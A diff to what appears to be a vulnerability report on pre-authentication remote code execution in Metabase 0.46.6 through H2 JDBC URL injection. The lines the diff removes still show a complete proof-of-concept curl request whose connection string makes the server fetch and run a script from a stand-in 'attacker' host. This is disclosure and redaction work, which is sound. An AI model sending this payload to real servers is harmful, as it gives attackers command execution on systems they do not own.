@@ -17,22 +17,7 @@ connection URL.
 The H2 JDBC URL supports an `INIT=` parameter that executes arbitrary SQL
 on connection, and H2's `RUNSCRIPT FROM` can fetch and execute a remote
 script. By chaining these, an unauthenticated attacker achieves OS command
-execution via H2's `CALL SHELLEXEC(...)`:
-
-```bash
-# PoC: pre-auth RCE via H2 JDBC injection
-curl -s -X POST http://<host>:3000/api/setup/validate \
-  -H 'Content-Type: application/json' \
-  -d '{
-    "token": "...",
-    "details": {
-      "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0;INIT=RUNSCRIPT FROM '"'"'http://attacker/exploit.sql'"'"'",
-      "advanced-options": false,
-      "ssl": false
-    },
-    "engine": "h2"
-  }'
-```
+execution via H2's `CALL SHELLEXEC(...)`.
 
 ## Affected Service
 - **Service:** Metabase 0.46.6
